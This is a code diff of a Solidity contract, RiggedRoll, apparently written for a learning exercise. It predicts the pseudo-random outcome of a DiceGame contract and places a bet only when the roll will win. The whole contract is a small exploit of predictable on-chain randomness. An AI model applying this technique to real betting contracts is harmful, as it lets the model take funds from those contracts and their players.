@@ -1,7 +1,7 @@
 pragma solidity >=0.8.0 <0.9.0;
 //SPDX-License-Identifier: MIT
 
-import "hardhat/console.sol";
+// import "hardhat/console.sol";
 import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
@@ -9,8 +9,8 @@ contract RiggedRoll is Ownable {
 
     DiceGame public diceGame;
 
-    event Difficulty(address indexed player, uint256 difficulty);
-    event Roll(address indexed player, uint256 roll);
+    event Difficulty(address indexed player, uint256 indexed blockNumber, uint256 difficulty);
+    event Roll(address indexed player, uint256 indexed blockNumber, uint8 indexed roll);
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
@@ -22,24 +22,25 @@ contract RiggedRoll is Ownable {
         require(sent, "Failed to send Ether");
     }
 
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner (we bet for 0, 1 and 2)
     function riggedRoll() public {
-        require(address(this).balance >= .002 ether, "not enough ether");
         //bytes32 prevHash = blockhash(block.number - 1);
-        console.log("difficulty: ", block.difficulty);
+        // console.log("difficulty: ", block.difficulty);
 
-        emit Difficulty(msg.sender, block.difficulty);
+        uint256 blockNumber = block.number / 10 * 10 - 10;
 
-        bytes32 hash = keccak256(abi.encodePacked(block.difficulty, address(diceGame), diceGame.nonce()));
-        uint256 roll = uint256(hash) % 16;
+        emit Difficulty(msg.sender, blockNumber, block.difficulty);
 
-        emit Roll(msg.sender, roll);
+        bytes32 hash = keccak256(abi.encodePacked(block.difficulty, address(diceGame), blockNumber));
+        uint8 roll = uint8(uint256(hash) % 16);
 
-        console.log("THE ROLL IS ",roll);
+        emit Roll(msg.sender, blockNumber, roll);
 
-        require (roll <= 2, "no win");
+        // console.log("THE ROLL IS ",roll);
 
-        diceGame.rollTheDice{value: .002 ether}();
+        require(roll <= 2, "no win");
+
+        diceGame.rollTheDice();
     }
 
     //Add receive() function so contract can receive Eth
